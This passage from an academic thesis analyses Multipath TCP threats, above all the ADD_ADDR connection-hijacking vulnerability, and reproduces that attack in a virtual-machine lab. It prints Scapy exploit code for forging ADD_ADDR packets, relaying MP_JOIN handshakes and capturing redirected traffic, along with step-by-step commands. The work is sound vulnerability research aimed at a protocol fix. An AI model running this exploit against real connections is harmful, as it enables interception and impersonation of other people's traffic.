\item \textit{Partial-time (time-shifted) on-path attacker}: the attacker has to be able to eavesdrop a specific set of information during the lifetime of the MPTCP connection in order to execute the attack. It doesn't need to eavesdrop the entire communication in between the hosts, and the specific direction and/or subflow for the sniffing procedure are attack specific;
\item \textit{On-path attacker}: the attacker has to be on at least one of the paths during the entire lifetime of the MPTCP session in order to execute the attack.
\end{itemize}

The critical case is the one concerning off-path attacks, which do not require any eavesdrop procedure in order to be executed. In fact, on-path attacks are not considered part of the MPTCP work, since they allows for a significant number of attacks on regular TCP already. A primary goal in the design of MPTCP is not to introduce new ways to perform off-path attacks or time-shifted attacks.

The effects of an attack over an MPTCP connection and the power that the attack can provide to the attacker can be divided into two main categories (from \rfc{7430}):

\begin{itemize}  
\item \textit{Passive attacker}: the attacker is able to capture some or all of the packets of the MPTCP session but it can't manipulate, drop or delay them, and it can't inject new packets in the current session either;
\item \textit{Active attacker}: the attacker can pretend to be someone else, introduce new messages, delete existing messages, substitute one message for another, replay old messages, interrupt a communication's channel or alter stored information in a computer.
\end{itemize}

The rate of success of a certain attack over a MPTCP connection strongly depends on the specific requirements: two attacks falling in the same categories in terms of attacker eavesdrop capabilities and passive/active typologies might have rather different rates of success. For example, a certain kind of attack might require IP spoofing, thus being unfeasible in a network with ``ingress filtering'', whose functioning is reported in \rfc{2827}.
There are no general thresholds to define when an attack can be considered a real threat according to the success rate, but this is an important factor to be studied in an attack analysis.

\section{Minor threats}
In this section are presented the minor residual threats for MPTCP under analysis by the IETF community at the time of writing, and all the related sections in this thesis closely follows such analysis as reported in the official document \rfc{7430}. Such vulnerabilities refer to the MPTCP specifications in \rfc{6824}. By labeling certain vulnerabilities as ``minor'' it means they are considered acceptable in the process of moving MPTCP towards Standard Track. 

\subsection{DoS attack on MP\_JOIN}
This kind of DoS attack would prevent hosts from creating new subflows. In order to be executed, the attacker has to know a valid token value of an existing MPTCP session. This 32-bit value can be eavesdropped or the attacker has to guess it.
This attack exploits the fact that a host B receiving a SYN+MP\_JOIN message will create a state before answering with the SYN/ACK+MP\_JOIN packet. This means that some resources will be consumed at the host to keep in memory information regarding this connection request from the other party; in this way, when the host B receives the third ACK+MP\_JOIN packet, it can correctly associate it to the initial request and complete the handshake procedure. The creation of such state is required because there is no information in the ACK+MP\_JOIN packet that links it to the first SYN+MP\_JOIN request, so it is up to the host to save all the ongoing requests.
An attacker can exploit this by sending SYN+MP\_JOIN packets to a host without providing the final acknowledge packets. This can be done until the attacked host runs out of available spots for initiating additional subflows. The initial number of such available spots depends on the implementation and configuration at the host machine. 

This attack can be exploited to perform a typical TCP flooding attack. This is a good example of how MPTCP might introduce new vulnerabilities. 
SYN flooding attacks for TCP have been studied for many years and current implementations use mitigation techniques like SYN cookies (defined in \rfc{4987}) in order to allow stateless connection initiations. But each SYN+MP\_JOIN packet received at the host would trigger the creation of an associated state, while this is not the case for the attacker machine that can simply forge these packet in stateless manner. Exploiting this unbalance in resource utilization is referred to as \textit{amplification attack}.

A possible solution to this problem is to extend the MP\_JOIN option format to include the information required to identify a specific request throughout the 3-way handshake, without requiring hosts to create associated states.

\subsection{Keys eavesdrop}
\label{keyseav}
An attacker can obtain the keys exchanged at the beginning of the MPTCP session, exploiting the fact that those are sent in clear. This is in fact a partial-time on-path eavesdropper attack, whose success would enable a vast set of attacking scenarios, even if the attacker itself has moved away from the session after sniffing the afore-mentioned keys.
The keys associated to an MPTCP session are sensitive pieces of information, used to identify a specific connection at the hosts and used as keying material for all the HMAC computations for the protocol. With such pieces of information an attacker can potentially execute a connection hijacking.  

The problem was acknowledged during the design of the first version of MPTCP, and considered acceptable. The maximum length of the TCP \textit{Option} field brings strong limitations for security implementations: for example, using certificates in TCP \textit{Options} would be impossible. Moreover, strong cryptographic computation is also discouraged inside TCP for performance reasons. Nevertheless, some techniques can be used to prevent the keys' eavesdrop attack other than the more obvious possibility of adopting pre-shared keys. Such techniques are mentioned in \rfc{7430}. Since this attack can affect security factors related to the main topic of this paper, namely ADD\_ADDR and ADD\_ADDR2, some of the proposed mitigation solutions are now presented in more details.

\subsubsection{Hash chains}
Hash chain is a way to obtain many one-time keys applying a cryptographic hash function recursively, starting from a random seed S:
  
  \[H[0] = H(S); H[1] = H(H[0]); H[2] = H(H[1]); ...; H[n] = H(H[n-1])\]
  
This technique allows to authenticate end hosts without the need to exchange keying material upfront. It is now reported the simplified scenario in which only host A needs to authenticate itself to host B. If host A initially identifies itself giving H[n], it can later on send H[n-1] for authentication towards host B. In fact, hash chains cannot be reversed (i.e. it is impossible to compute H[n-1] by just knowing H[n]), meaning only host A could have generated a valid H[n-1]; host B can verify its authenticity by simply hashing it and checking that it is equal to the previously seen H[n].
  The main issues with this operation is that, once H[n-1] is sent by host A, it cannot be reused, since this might have been eavesdropped, leading to a situation not dissimilar to the original problem. With key chains, hosts would continue traversing down the chain, meaning that a second authentication would require host A to send H[n-2] (of course, host A can calculate any value in the chain since it knows the original seed), and host B must have saved previously acknowledged H[n-1] to verify that H[H[n-1]] equals the received H[n-2] value.
  The main issue with this solution is that the value ``n'' will eventually reach 0, meaning that host A needs to compute a new hash chain from a new seed and also signal host B about this operation, thus requiring the definition of a new MPTCP option containing the final entry of the old chain (for authentication purposes) and the first entry of the new chain.
  Another direct consequence of such solution is that hash chains would add computational complexity to MPTCP operations, despite it being still reasonably acceptable.
  An unverified proposal for the new message exchange using hash chain can be found on the IETF mailing list \cite{hashchain}.
%\begin{figure}[!htb]
%\centering
%\includegraphics[width=0.75\textwidth]{images/hashchain}
%\caption{Hash chain message exchange proposal}
%\label{fig:hashchain}
%\end{figure}
In this proposal, four MP\_JOIN messages are exchanged in total: the first two messages are used for authentication purposes (the hash chain values are transmitted there together with the required tokens), but the last two messages operate in a similar fashion with respect to the current MPTCP solution, carrying an HMAC value whose key depends on the original keys exchanged via the MP\_CAPABLE option. In this way, eavesdropping the original keys is not enough to operate on the connection, but knowing the original keys is still required to validate subflows' creation.

\subsubsection{SSL/TLS and SSH}
Another well rated proposal to solve the keys' eavesdrop threat is to use application-layer protocols like SSL/TLS or SSH to negotiate a shared key between the end-points. For example, SSL/TLS already provides a mechanism to negotiate shared secret by using a Diffie-Hellman algorithm, by exploiting asymmetric cryptographic computations as explained in \rfc{6101}, \textit{The Secure Sockets Layer (SSL) Protocol Version 3.0}. An RFC draft can be found to describe a possible prototype for this solution in MPTCP \cite{paasch-mptcp-ssl-00}. A bit field in the MP\_CAPABLE option would signal the intent of using keys provided by the application layer for the connection (maintaining retro-compatibility with older versions of MPTCP that do not support this feature).
The main draw back of asking the application layer to provide the security mechanism, is that the application itself has to be upgraded to use the necessary MPTCP socket options:

\begin{itemize}
  \item MPTCP\_ENABLE\_APP\_KEY: when this option is enabled, MP\_CAPABLE is sent with the proper bit in order to signal the usage of an application supplied key for authentication;
  \item MPTCP\_KEY: this socket option is used to pass the actual key to the MPTCP layer.
\end{itemize}

Some synchronization concerns might arise due the fact that it's possible the client's application has already called the socket with the proper options while the server is still waiting for the key. In this case, temporarily dropping the SYN packets from the client, together with the usual TCP retransmission mechanism, should solve the problem.

\subsubsection{Secure MPTCP}
Secure MPTCT (SMTCP) refers to the integration of MPTCP with \textit{tcpcrypt} \cite{draft-bagnulo-mptcp-secure}, the latter being a protocol that attempts to encrypt almost the entire content of the traffic \cite{ietf-tcpinc-tcpcrypt-00}. SMTCP has been proposed as more secure version of MPTCP that would protect the data stream itself rather than addressing each and every security flaw in the signalling components of the protocol. Indeed, all the MPTCP signalling data would be encrypted and integrity protected as well, meaning that the overall protection for MPTCP would be achieved by the {tcpcrypt} extensions alone. An interesting factor of this solution, is that tcpcrypt also require sharing keying material to provide encryption, thus being tcpcrypt itself vulnerable to Man-in-the-Middle attacks during the initial key negotiation.

\subsection{SYN/ACK attack}
This is a partial-time on-path active attack. An attacker that can intercept and alter the MP\_JOIN packets is able to add any address it wants to the session. This is possible because there is no relation between the source addresses and the security material in the MP\_JOIN packets. But securing the source address in MP\_JOIN is not feasible if MPTCP is supposed to work through NATs, since they also operate in a similar manner over the source address in the packets, meaning that it is impossible to mitigate this attack without disrupting NATs' behavior by introducing modifications at the transport layer. Possible solutions have to reside on a different layer, perhaps securing the payload as a technique to limit the impact of such attack in a MPTCP session.

\section{ADD\_ADDR attack} 
\label{theaddaddrattack}
This paper is mainly focused on studying and testing the ADD\_ADDR vulnerability of MPTCP, as well as providing an analysis of the commonly accepted fix and its implementation in Linux Kernel. This section describes the attack procedure in details by following the corresponding analysis reported in \rfc{7430}, while the considerations about the possible solutions for the ADD\_ADDR vulnerability as well as the implementation of the currently accepted solution can be found in chapter \ref{chap:addaddr2}. A simulated attack exploiting the vulnerability is reported in chapter \ref{chap:addaddrattackexecution}.

\subsection{Concept}
The ADD\_ADDR attack is an off-path active attack that exploits a major vulnerability in the MPTCP version 0. As previously mentioned, the attacks falling into this category are usually the most critical ones and can easily compromise the protocol security capabilities.
With the current MPTCP model, an attacker can forge and inject an ADD\_ADDR message into an MPTCP session to achieve a complete hijacking of the connection, placing itself as a man-in-the-middle. Being this an off-path attack, the attacker can conceptually send the forged ADD\_ADDR message from anywhere in the network (if allowed by routing), with no need to be physically close to the victim machines. At the end of the attacking procedure, the attacker will be able to operate in any way on the ongoing data transmission, with no clear warning given to the original parties involved in the MPTCP session.
% Add possible scenarios in which this could be dangerous
If no protection system is used at the application layer (like data encryption), the attacker can eavesdrop all the information and even modify or generate the exchanged content. The attack vector enabled by such exploit is huge and indeed not acceptable for the new protocol. For this reason, the ADD\_ADDR vulnerability is classified differently with respect to the minor threats listed in the previous section, and due to its characteristics it is considered a blocking issue in the MPTCP progress towards Standard Track as stated in \rfc{7430}.

\subsection{Procedure}
Let's consider a scenario in which two machines, host A and host B, are communicating over an MPTCP session involving one or more subflows. The attacker is called host C and it is operating remotely with no eavesdrop capabilities. The attacker is using address IPC and targeting a single MPTCP subflow between host A (address IPA and port PA) and host B (address IPB and port PB), even if other subflows might be operational. The scenario is reported in figure \ref{fig:attack1}.

\begin{figure}[!htb]
\centering
\includegraphics[width=0.8\textwidth]{images/Attack1}
\caption{Attack scenario}
\label{fig:attack1}
\end{figure}

Here is reported the procedure to carry out the ADD\_ADDR attack from a high-level perspective (the format of all the mentioned MPTCP option can be found in chapter \ref{chap:multipathtcp}):

%Consider adding images for each and every step of the attack

\begin{enumerate}  
\item  The first step performed by the attacker is to forge an ADD\_ADDR message as follows: it is an ACK TCP packet with source address IPA, destination address IPB and the advertised address in the ADD\_ADDR option is IPC. The ADD\_ADDR option also contains the address ID field, that cannot collide with existing identifiers for the ongoing subflows between hosts A and B. Even if the attacker cannot be certain about which value for address ID to use, high numbers are usually not already in use, meaning that the address ID does not offer a protection mechanism of any kind in this context.
The forged packet is sent to host B.

\item Host B will process the forged packet as a legitimate request from host A of advertising a new available interface with address IPC. This most likely triggers the creation of a new subflow towards the new IP address, meaning that host B sends a SYN+MP\_JOIN packet to the attacker (in the case of the Linux implementation of MPTCP, the targeted host B has to be the client for the connection, since only the clients can open new subflows). This packet contains all the security material needed in the first phase of the MP\_JOIN three-way handshake, and the attacker does not need to operate over that portion of data: the attacker C simply manipulates the SYN+MP\_JOIN packet by changing the source IP to IPC and the destination IP to IPA; then, it forwards such packet to host A.

\item Host A will process the incoming packet as a legitimate request by host B of starting a new subflow from host B's new available interface having address IPC. All the required information is present in the MP\_JOIN option, like the token of host A that identifies the specific MPTCP session to which attach the new subflow to. Host A computes all the needed parameters (including a valid HMAC value), generates the SYN/ACK+MP\_JOIN packet and finally send it to IPC (which in reality belongs to the attacker). The attacker, similarly to the previous steps, manipulate the IP addresses of the packet from A by changing the source endpoint from IPA to IPC and the destination endpoint from IPC to IPB. At this point, attacker C sends the packet to host B.

\item All the parameters in the received packet looks correct to host B, which replies with an ACK+MP\_JOIN packet to attacker C. The attacker changes the source address to IPC and the destination address to IPA and sends the modified packet to host A. Upon acknowledge reception, host A will verify all the parameters in the packet (which will be correct since properly calculated by host B), and create a new subflow towards the address IPC. At this point the attacker has managed to place itself as man-in-the-middle.

\item As a further, optional step, the attacker can send RST packets to the other subflow in order to close them thus being able to perform a full hijack of the MPTCP session between host A and host B. The attacker can now operate upon the connection in any possible way, modifying, delaying, dropping, forging packets between the two parties.
\end{enumerate}

By exploit the ADD\_ADDR option, the attack procedure is relatively straightforward. Albeit there are some important requirements and limitations that consistently limit the rate of success of such attack, which are discussed in the following section (following the analysis in \rfc{7430}.

\subsection{Requirements}
A first, basic prerequisite needed by the attacker to inject the ADD\_ADDR message into an ongoing MPTCP session is to know the IP addresses and port values adopted by host A and host B for the targeted subflow. It is reasonable to assume that the IP addresses are known. In a typical client-server configuration, the server's port for a certain application protocol is fixed and can be assumed to be known, too. For the client counterpart, the port value can cause problems in the presence of protection techniques like port randomization (defined in \rfc{6056}, \textit{Recommendations for Transport-Protocol Port Randomization}): in these cases the attacker has to start a guessing procedure whose rate of success also depends on the adopted ephemeral port range.

The knowledge about the above-mentioned 4-tuple is a basic requirement for obvious reasons, but knowing the endpoint details is not enough to inject valid packets into an ongoing TCP session (that, in this case, can be also seen as an MPTCP subflow session): these packets have to contain sequence (SEQ) and acknowledgment (ACK) numbers that are compatible with the current ones within the stream. SEQ and ACK values are used in TCP to provide reliable, in-order transmission of data as well as services related to flow and congestion control. A very common protection technique is to randomize those 32-bit values at TCP connection setup, forcing the attacker (who acts off-path) to blindly guess them. TCP provides a window mechanism to deal with possible transmission's misalignments: at any given time, the accepted ACK values are those between the last ACK received and the same value plus the receiving window parameter. As a result, the number of packets to be sent in the attempt of guessing the right SEQ and ACK values and consequently the rate of success of the attack are strongly influenced by the TCP receive windows size at the targeted TCP host.

The requirements listed so far all pertain to the underlying TCP protocol, whose validation mechanisms are still in place even for MPTCP subflows. The only MPTCP specific parameter that can cause the failure of the ADD\_ADDR attack procedure is the address ID field in the option. The purpose of this value has been previously explained, and it doesn't actually offer an overall protection improvement. It is enough for the attacker to chose an address ID value that is not in use by other subflow in the MPTCP session. In usual scenarios with a relatively limited number of subflows within the MPTCP session, applying a random value to this field (or a high number) should work just fine.

Moving away from the inner parameters evaluation and taking into consideration external protection mechanisms, it is worth mentioning that the attacker has to be able to manipulate and forge packets, including changing their source address field. This process, known as ``IP spoofing'', is a well known technique for which protection technologies have been developed, most notably the ``ingress filtering'' (\rfc{2827}, \textit{Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing}) or the ``source address validation'' (\rfc{7039}, \textit{Source Address Validation Improvement (SAVI) Framework}). However, these methods are not vastly deployed and cannot be considered a sufficient mitigation for the ADD\_ADDR vulnerability. %Add statistics on usage of these techniques

Lastly, the attacker has to be able to direct the malicious ADD\_ADDR packet to a host that is actually capable of starting a new subflow, namely the client in a client-server model. The current Linux Kernel implementation prohibits the server to instantiate a new subflow and only the client does so.

\chapter{ADD\_ADDR attack simulation}
\label{chap:addaddrattackexecution}

\section{Environment setup}
\label{envsetup}
In order to achieve a reliable reproduction of a real world scenario, the simulation involves the setup of two User Mode Linux (UML) virtual machines running a Linux Kernel with enabled support for MPTCP. These two machines act as client and server, carrying on an MPTCP connection that is the target for the ADD\_ADDR attack. 
Using UML to proceed with the experiments allows for very fast setup and boot-up time, with good emulation of real devices and giving the possibility to work on a single hosting machine with no risk of damaging or crashing its underlying kernel.

A good resource in terms of tools, configuration files and kernel images is the official mptcp website:
\textit{http://www.multipath-tcp.org}. In particular, the website offers a Python script that downloads all the necessary files to run the two virtual machines. Considering our purpose of verifying the ADD\_ADDR attack feasibility, there is no need to modify or debug the Linux Kernel source code, and the above mentioned components can be used out of the box. At this stage of the analysis it is actually advised to perform the attack on the official distribution as is, and develop external tools for injecting packets and monitoring the status of the connections. More specifically, the MPTCP version adopted for the tests is: \textit{Stable release v0.89.0-rc}.

When executing the script \textit{setup.py} retrieved from the official Website, a few files are downloaded. A \textit{vmlinux} executable file with the MPTCP compatible Linux kernel, two file-systems for the client and the server (\textit{fs\_client} and \textit{fs\_server}) and two shell scripts to configure and run the virtual machines (\textit{client.sh} and \textit{server.sh}). No manual configuration is needed, and client and server should be able to connect via MPTCP right away.
Here it follows the content of the \textit{client.sh} (a similar shell script, that is not reported here, can be found for the server counterpart, including a single \textit{tap2} interface setup in that case):


\begin{lstlisting}[language=bash, caption=\textit{client.sh}, label=clientconf]
#!/bin/bash

USER=`whoami`

sudo tunctl -u $USER -t tap0
sudo tunctl -u $USER -t tap1

sudo ifconfig tap0 10.1.1.1 netmask 255.255.255.0 up
sudo ifconfig tap1 10.1.2.1 netmask 255.255.255.0 up

sudo sysctl net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -s 10.0.0.0/8 ! -d 10.0.0.0/8 -j MASQUERADE

sudo chmod 666 /dev/net/tun

./vmlinux ubda=fs_client mem=256M umid=umlA eth0=tuntap,tap0 eth1=tuntap,tap1

sudo tunctl -d tap0
sudo tunctl -d tap1

sudo iptables -t nat -D POSTROUTING -s 10.0.0.0/8 ! -d 10.0.0.0/8 -j MASQUERADE
\end{lstlisting}

These scripts call the \textit{tunctl} command to create the tap interfaces and later assign an IP address to them by using \textit{ifconfig}. A tap (namely ``network tap'' or ``tap interface'') simulates a link layer device and it can be used to create a network bridge. How taps are used in the simulation will become clear when observing the final network scenario.
In order for the new tap interfaces to recognize each other and being able to send packets to each other it is necessary to enable the ``ip forwarding'' option on the hosting machine using the corresponding \textit{sysctl} command. It is also necessary to configure the \textit{iptables} upon startup, and also this point is already taken care of in the downloaded scripts. The virtual machine is launched in the script by executing the \textit{vmlinux} file with some options to define various properties (mounting the file system, assigning memory size) as well as attaching the newly created tap interfaces, that will be used locally (from the hosting machine) to sniff and inject packets, acting, in this specific case, as a physical man-in-the-middle.

The resulting network scenario is graphically depicted in Figure \ref{fig:networkscenario}.

\begin{figure}[!htb]
\centering
\includegraphics[width=\textwidth]{images/Network_Scenario}
\caption{Network scenario}
\label{fig:networkscenario}
\end{figure}

In order to carry out the ADD\_ADDR attack it is necessary to inject forged packets into the existing MPTCP flow. In order to do this it is possible to use Scapy, a powerful interactive packet manipulation program that is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more [\textit{http://www.secdev.org/projects/scapy}]. Moreover, there exists an unofficial version of Scapy by Nicolas Maître that supports MPTCP and it can be found at the following repository: \textit{https://github.com/nimai/mptcp-scapy}. The Python script developed for the thesis work that can be used to carry out the ADD\_ADDR attack can be found here: \textit{https://github.com/fabriziodemaria/MPTCP-Exploit}. 

It is appropriate to mention here some of the limitations of the tool (that are examined more in details in section \ref{limitationsandfuturework}: \textit{Limitations and future work}): the tool has been designed to hijack a specific kind of communication involving client and server sending each others text messages using the tool \textit{netcat}. It is very unlikely that the procedure would work with another kind of MPTCP connection setup between client and server. Nevertheless, this specific exploit serves well our purpose of assessing the danger and feasibility of the ADD\_ADDR attack in general terms.
Moreover, this tool simplify the attack procedure by sniffing the SEQ and ACK numbers of the ongoing connection instead of starting a procedure to try and guess the values. Also, the ports in use by the client and the server are retrieved automatically by inspecting the sniffed packets, while the IP addresses have to be provided by the user when launching the attack script. Further considerations about these simplifications can be found in section \ref{limitationsandfuturework}.

The python module \textit{test\_add\_address.py} in the root of the GitHub repository follows the analysis in \rfc{7430} to perform the various steps necessary to hijack the MPTCP connection. All the requirements and theoretical details about this procedure have been reported in section \ref{theaddaddrattack}, and this section is limited to show and investigate the actual implementation of the attack.

\section{Attack script}
The very first step performed by the Scapy attack script is the following: all the RST outgoing packets that can be generated by the hosting machine (the attacker) must be blocked during the process, when the first phases are completing and no finalized TCP connection can be actually detected by the system. To cope with this, the commands in listing \ref{norst} are executed first.


\begin{lstlisting}[language=python, caption=\textit{Disable RST outgoing packets}, label=norst]
execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP", shell = True)
execCommand("sudo iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP", shell = True)
\end{lstlisting}

The Scapy built-in \textit{sniff} function allows to retrieve packets from a specific interface, according to a custom filter function \textit{filter\_source} that inspects the source address. From the packet retrieved in this way (saved into the variable named \textit{pktl}), it is possible to retrieve the IP addresses, ports, SEQ and ACK numbers of the ongoing connection between client and server. The call to the function is shown in listing \ref{sniff1}

\begin{lstlisting}[language=python, caption=\textit{Sniffing a first packet from the client}, label=sniff1]
pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: filter_source(p, CLIENT_IP), count=1)
\end{lstlisting}

In this case, the \textit{filter\_source} function simply checks that the sniffed packet is indeed coming from the client UML by inspecting the source IP. 

The first constructive step of the whole procedure consists in forging of the ADD\_ADDR packet using the method \textit{forge\_addaddr} (Listing \ref{forgeaddaddrfunction}). This function accepts all the parameters required to forge the proper message, including the sniffed SEQ and ACK numbers retrieved from \textit{pktl} and the IP address to be added in the ADD\_ADDR option (\textit{myIP}).

\begin{lstlisting}[language=python, caption=\textit{forge\_addaddr method}, label=forgeaddaddrfunction] 
def forge_addaddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    pkt = (IP(version=4L, src=srcIP, dst=dstIP)/ TCP(sport=srcPort, dport=dstPort, flags="A", seq=sniffedSeq, ack=sniffedAck, options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID, adv_addr=myIP))]))
    return pkt
\end{lstlisting}

Here comes the first consideration about the script design: once the ADD\_ADDR is sent to the victim client, the tool has to be already listening for the MP\_JOIN sent back as a response; in order to make sure this happens, multithreading is used to start looking for the MP\_JOIN packet even before ADD\_ADDR is sent, with the thread named \textit{SYNThread} (listing \ref{capture1}). 


\begin{lstlisting}[language=python, caption=\textit{Multiple threads are used to capture the answer from the UMLs}, label=capture1]
...
# Start waiting for SYN from client
thread1 = SYNThread(1, "Syn capturing thread", 1, CLIENT_IF)
thread1.start()
time.sleep(THREAD_SYNC_TIME) # Give time to thread1 to start tcpdumping
... # sending forged ADD_ADDR
thread1.join() # This should contain the received SYN from the client
print "[20%] Phase 1 - Received SYN from client"
...
\end{lstlisting}

\textit{SYNThread} just calls the method \textit{get\_MPTCP\_syn} in the module \textit{sniff\_script.py}, that uses \textit{tcpdump} with a specific filter option. In fact the Scapy \textit{sniff} functionality proves to be unreliable in case of a high flow of packets to be processed and often skips some when the buffers reach their limits. Even if this is fine in other parts of the script where any packet capture is fine to retrieve ACK and SEQ numbers (for example in the previously described phase, listing \ref{sniff1}), it is mandatory not to miss the single MP\_JOIN+SYN packet sent by the client upon ADD\_ADDR reception. This problem concerning the sniffing function of Scapy is also reported in the official website under the section "Known bugs": \textit{May miss packets under heavy load}.
Note that this wouldn't be a problem with the slow message exchange of \textit{netcat}, but the script can be also tested with high throughput applications like \textit{iperf}, hence the usage of the more reliable \textit{tcpdump}.
In order to filter out exactly the MP\_JOIN packet we are looking for, the following command in Listing \ref{tcpdump} is used, where \textit{tf} is just a temporary file to store the information and \textit{i} is the interface name passed as a parameter.

\begin{lstlisting}[language=python, caption=\textit{tcpdump for MP\_JOIN}, label=tcpdump]
execCommand("sudo tcpdump -c 1 -w " + tf.name + ".cap -i " + i + " \"tcp[tcpflags] & tcp-syn != 0\" 2>/dev/null", shell = True)
\end{lstlisting}

A similar sniffing procedure is used for the next steps regarding SYN/ACK and ACK MP\_JOIN packets, as it can be seen for the threads named \textit{SYNACKThread} and \textit{ACKThread}. Each time these sniffing threads are started, a sleep function is called for a time expressed in \textit{THREAD\_SYNC\_TIME}, as a poor but effective mechanism that ensures that \textit{tcpdump} is called and running in the new threads before proceeding (listing \ref{capture1}, line 5).

The MP\_JOIN packets generated and received in this way are manipulated to change the IP addresses and ports (and possibly other fields) as described in the attack procedure and then forwarded to the right host. Note that manipulating packet's fields in Scapy is different with respect to the case of ADD\_ADDR where the packet is forged from scratch. All the functions \textit{manipulate\_ack}, \textit{manipulate\_synack} and \textit{manipulate\_syn} don't forge a new packet but slightly modify a copy of the received packet. While doing this it is necessary to eliminate the \textit{checksum} value so that Scapy automatically recalculate the correct value for it before sending the packet on the wire, taking into consideration the updated values. Similar considerations hold for the Ethernet layer of the manipulated packets. 
Once the last ACK for the MP\_JOIN procedure is sent to the server, the new subflow is operational. The next steps in the script enable again the outgoing RST packets and forge some of them to close all the subflows apart from the malicious one. By following the \textit{print} messages in the script, this corresponds to \textit{Phase 5}. Now, all the messages from the server to the client are sent to the attacker instead, without an explicit way for the victim to notice. 
The very last portion of the script runs the method \textit{handle\_payload} (listing \ref{handlepayload}) that both prints the text messages (line 12) received from the server and generate DATA\_ACK DSS options for the server in order to keep the connection alive (line 15). 

\begin{lstlisting}[language=python, caption=\textit{Filter function for the sniffing tool when receiving redirected traffic of the hijacked connection from the server}, label=handlepayload]
def handle_payload(p, SERVER_IF, MY_IP):
    # Only read incoming packets (simulating off-path attack)
    if p.haslayer(IP) and p.haslayer(TCP) and p[IP].dst != MY_IP:
        return
    # Dirty passage, just avoid packets without MPTCP - DATA DSN
    if p.haslayer(TCP):
        dsa = get_DSS_Ack(p)
        if dsa == -1:
            return
        # Print the redirected traffic!
        if p.haslayer(Raw):
            print "Captured: \"" + p[Raw].load[:-1] + "\""
            # Generate data_ack for the server in order to keep receiving the next messages
            length = len(p[Raw].load)
            pkt = (IP(version=4L,src=p[IP].dst,dst=p[IP].src)/                          \
                     TCP(sport=p[TCP].dport, dport=p[TCP].sport, flags="A",             \
                     seq=p[TCP].ack, ack=(p[TCP].seq + length), options=[TCPOption_MP(  \
                     mptcp=MPTCP_DSS_Ack(data_ack=(dsa + length)))]))
            send(pkt, iface=SERVER_IF, verbose=0)
\end{lstlisting}

\section{Reproducing the attack}
\label{reprattack}
This procedure has been tested on a Ubuntu 14.04 LTS machine. Before reading the following steps, download all the required files for the setup as described at the beginning of section \ref{envsetup}.

\begin{enumerate}
\item
    Open two terminal windows and run the \textit{client.sh} and \textit{server.sh} scripts to launch the UML virtual machines (user/password: \textit{root});
\item
    On the server machine, run the following (it is possible to chose any viable TCP port):
\begin{verbatim}
        netcat -l -p 33443
\end{verbatim}
\item
    On the client machine, it is necessary to disable one of the two network interfaces, namely \textit{eth1}. This is necessary due to some limitations currently affecting the Scapy tool and the attacking script (the connection will still be MPTCP, with a single subflow):
\begin{verbatim}
        ifdown eth1
\end{verbatim}
\item
    Now you can run \textit{netcat} on the client, too:
\begin{verbatim}
        netcat 10.2.1.2 33443
\end{verbatim}
\item
    Try to exchange messages between client and server to verify that communication is active;
\item
    Now it is possible to start the attack by opening a new terminal on the local machine (it is necessary to start the Scapy script \textit{after} having established the \textit{netcat} connection);
\item
    Go to the folder were you downloaded the Scapy tool and type the following:
\begin{verbatim}
        sudo python test\_add\_address.py 10.1.1.1 \
        10.2.1.2 10.1.1.2 tap2 tap0
\end{verbatim}
    NOTE: If an import error appears, try to install the missing dependencies with:
\begin{verbatim}
        sudo apt-get install python-netaddr
\end{verbatim}
\item
    Go back to the client UML terminal and start sending messages to the server. While the messages exchange goes on, the attack script progresses. 
\item
    If 100\% progress is reached in the attack process, just try to send a message from the server to the client and it will be sent to the attacking machine instead (i.e. to localhost). Further improvements would allow to also answer back to the server, thus impersonating the client.
\end{enumerate} 

The capture file resulting from this attack can be inspected in appendix \ref{app:a}.

\section{Conclusions} 
\label{limitationsandfuturework}
The Scapy tool developed for this research targets a specific scenario to exploit the ADD\_ADDR vulnerability. It is not intended to be general enough to break all the existing MPTCP implementations. Nevertheless, by succeeding in this specific case involving a \textit{netcat} communication between two hosts, it is indeed proved the feasibility and gravity of the problem, and it should be relatively easy to extend the portability of the attacking tool to act in new scenarios, if required.
This section mainly investigates the workarounds used to simplify the attacking process, to prove that they are not critical enough to devalue the results of the tool itself.

All the requirements for the succeeding of the attack have been already listed in Section \ref{theaddaddrattack}. Here is reported a short summary:

\begin{itemize}  
\item the four-tuple: IP and port for both source and destination;
\item valid ACK/SEQ numbers for the targeted subflow;
\item valid address identifier for the malicious IP address used to hijack the connection;
\end{itemize}

Regarding the last point, the Address ID chosen for the new subflow initiated by the attacker must be different from all the other IDs already used by the other subflows. It is fairly easy to choose a value quite high that has very low probability of being in use already. This value is set to 6 by default in the Scapy attack script.

It is a fair assumption that the four-tuples identifying the connection endpoints are known by the attacker, apart from the client side port value: in that case the difficulty in guessing the right port in use very much depends on the port randomization technique deployed at the client host \rfc{6056}. Since it is anyway possible to guess the port, it is a fair simplification to simply provide it to the application in our tests: for this reason the tool has been designed to accept the IP addresses as arguments and automatically gets the ports in use to increase the rate of success in different testing scenarios, without the need for the user to provide that kind of information.

Guessing the SEQ and ACK numbers is by far more complex. Again, all the considerations about this have been reported in previous sections: it is possible to generate a big number of packets trying to guess the acceptable values for packet injection. This is out of the scope for this research, so it is acceptable to simplify the attack by providing the SEQ and ACK values (by sniffing them from the ongoing connection).

It is important to emphasize that despite these workarounds, that require to act as a physical man-in-the-middle, no other information apart from the ports, SEQ and ACK values have been retrieved using Scapy's \textit{sniff} or \textit{tcpdump}, and no packet originally sent to the trusted hosts have been discarded or modified. All the sniffed values can be guessed and, despite the reduced chance of success, the exploit could be executed via a 100\% off-path attack. That is why this is considered a major vulnerability for MPTCP deployment as of \rfc{7430} indications. In the next sections the solution to this problem and its Linux Kernel implementation are discussed in the details.
\chapter{Fixing ADD\_ADDR}
\label{chap:addaddr2}

\section{The ADD\_ADDR2 format}
There is an ongoing effort to move the current MPTCP specification \ref{6824} from Experimental to Standard Track. Solving the ADD\_ADDR vulnerability is believed to be a fundamental step to reach the required security standards for the transition to happen.
By analyzing the nature of the vulnerability, various proposals have been elaborated to modify the design of the ADD\_ADDR option [\rfc{7430}]. The conceptual flaw behind the option is that no secret material related to the ongoing MPTCP is included. The only security mechanism connected to such message is indeed the TCP-level sequence and acknowledge numbers, that an attacker has to know in order to inject such message into an ongoing session.
